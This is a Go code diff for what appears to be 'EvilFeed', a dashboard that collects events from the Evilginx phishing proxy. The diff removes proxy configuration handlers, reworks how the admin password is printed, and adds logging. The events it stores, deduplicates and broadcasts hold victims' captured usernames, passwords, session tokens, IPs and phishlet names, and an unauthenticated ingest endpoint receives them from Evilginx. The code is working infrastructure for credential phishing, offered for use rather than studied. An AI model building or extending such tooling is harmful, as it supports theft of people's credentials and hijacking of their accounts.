@@ -877,56 +877,6 @@ func handleBlocklistPush(w http.ResponseWriter, r *http.Request) {
 	w.Write(respBody)
 }
 
-// handleProxySync handles GET requests to fetch Proxy config from Evilginx
-func handleProxySync(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodGet {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-
-	if !checkEvilginxAPI() {
-		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
-		return
-	}
-
-	cfg := fetchProxyConfig()
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{
-		"type":     cfg.Type,
-		"address":  cfg.Address,
-		"port":     cfg.Port,
-		"username": cfg.Username,
-		"enabled":  cfg.Enabled,
-	})
-}
-
-// handleProxyPush handles POST requests to push Proxy config to Evilginx
-func handleProxyPush(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-
-	if !checkEvilginxAPI() {
-		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
-		return
-	}
-
-	var req ProxyConfig
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Invalid request body", http.StatusBadRequest)
-		return
-	}
-
-	if err := updateProxyConfig(&req); err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
-}
-
 // ProxyConfig represents the Proxy configuration from Evilginx
 type ProxyConfig struct {
 	Type     string `json:"type"`
@@ -1004,7 +954,7 @@ func initAuth() {
 	}
 
 	if count == 0 {
-		// Generate initial password and store it (plaintext) for display until changed
+		// Generate initial password
 		password := generateRandomString(12)
 		hash := hashPassword(password)
 
@@ -1013,32 +963,11 @@ func initAuth() {
 			log.Fatal(err)
 		}
 
-		// Store the plaintext password in settings for display until user changes it
-		_, _ = db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('initial_password', ?)", password)
-	}
-
-	// Always check if password needs to be displayed (must_reset = 1 means user hasn't changed it)
-	var mustReset int
-	err = db.QueryRow("SELECT must_reset FROM admin LIMIT 1").Scan(&mustReset)
-	if err == nil && mustReset == 1 {
-		// Get the stored initial password
-		var initialPassword string
-		err = db.QueryRow("SELECT value FROM settings WHERE key = 'initial_password'").Scan(&initialPassword)
-		if err == nil && initialPassword != "" {
-			fmt.Println()
-			fmt.Println("\033[1;33m╔══════════════════════════════════════════════════════════════╗\033[0m")
-			fmt.Println("\033[1;33m║              EVILFEED DASHBOARD CREDENTIALS                  ║\033[0m")
-			fmt.Println("\033[1;33m╠══════════════════════════════════════════════════════════════╣\033[0m")
-			fmt.Println("\033[1;33m║\033[0m  Username: \033[1;32madmin\033[0m                                            \033[1;33m║\033[0m")
-			fmt.Printf("\033[1;33m║\033[0m  Password: \033[1;32m%-40s\033[0m      \033[1;33m║\033[0m\n", initialPassword)
-			fmt.Println("\033[1;33m╠══════════════════════════════════════════════════════════════╣\033[0m")
-			fmt.Println("\033[1;33m║\033[0m  \033[1;31m⚠ Change this password after first login!\033[0m                 \033[1;33m║\033[0m")
-			fmt.Println("\033[1;33m╚══════════════════════════════════════════════════════════════╝\033[0m")
-			fmt.Println()
-		}
-	} else {
-		// Password has been changed, remove the stored initial password
-		_, _ = db.Exec("DELETE FROM settings WHERE key = 'initial_password'")
+		fmt.Println("\n[+] ================================================== [+]")
+		fmt.Println("[+] Initial Admin Password Generated: " + password)
+		fmt.Println("[+] Please login and change this password immediately.")
+		fmt.Println("[+] ================================================== [+]")
+		fmt.Println()
 	}
 }
 
@@ -1230,12 +1159,17 @@ func persistAndBroadcast(e *Event) error {
 		if err == nil && count > 0 {
 			// Duplicate found - update existing instead of inserting new
 			// SQLite doesn't support ORDER BY/LIMIT in UPDATE, so use subquery
-			db.Exec(`
+			_, err := db.Exec(`
 				UPDATE events SET password = ?, tokens = ?, timestamp = ?, message = ?, rid = COALESCE(NULLIF(?, ''), rid)
 				WHERE id = (SELECT id FROM events WHERE type = ? AND ip = ? AND phishlet = ? AND username = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 1)`,
 				e.Password, e.Tokens, e.Timestamp, e.Message, e.RID,
 				e.Type, e.IP, e.Phishlet, e.Username, fiveMinAgo)
-			// Still broadcast the update (no terminal logging to keep password visible)
+			if err != nil {
+				log.Printf("[DEDUP] Update failed: %v", err)
+			} else {
+				log.Printf("[DEDUP] Updated existing %s event for %s from %s", e.Type, e.Username, e.IP)
+			}
+			// Still broadcast the update
 			if globalHub != nil {
 				data, _ := json.Marshal(e)
 				globalHub.broadcast <- data
@@ -1933,11 +1867,12 @@ func handleIngestEvent(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if err := persistAndBroadcast(&e); err != nil {
+		log.Printf("Failed to persist event: %v", err)
 		http.Error(w, "Failed to save event", http.StatusInternalServerError)
 		return
 	}
 
-	// Events are only shown in the web UI, not in terminal (to keep password visible)
+	log.Printf("[INGEST] %s event from %s (%s)", e.Type, e.IP, e.Username)
 	w.WriteHeader(http.StatusOK)
 	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
 }
@@ -2107,8 +2042,6 @@ func main() {
 	http.HandleFunc("/api/cloudflare/push", authMiddleware(handleCloudflarePush))
 	http.HandleFunc("/api/blocklist/sync", authMiddleware(handleBlocklistSync))
 	http.HandleFunc("/api/blocklist/push", authMiddleware(handleBlocklistPush))
-	http.HandleFunc("/api/proxy/sync", authMiddleware(handleProxySync))
-	http.HandleFunc("/api/proxy/push", authMiddleware(handleProxyPush))
 	http.HandleFunc("/api/internal/settings", handleInternalSettings)
 	http.HandleFunc("/api/internal/ingest", handleIngestEvent) // Event bridge from Evilginx
 	http.HandleFunc("/api/whitelist", authMiddleware(handleWhitelist))
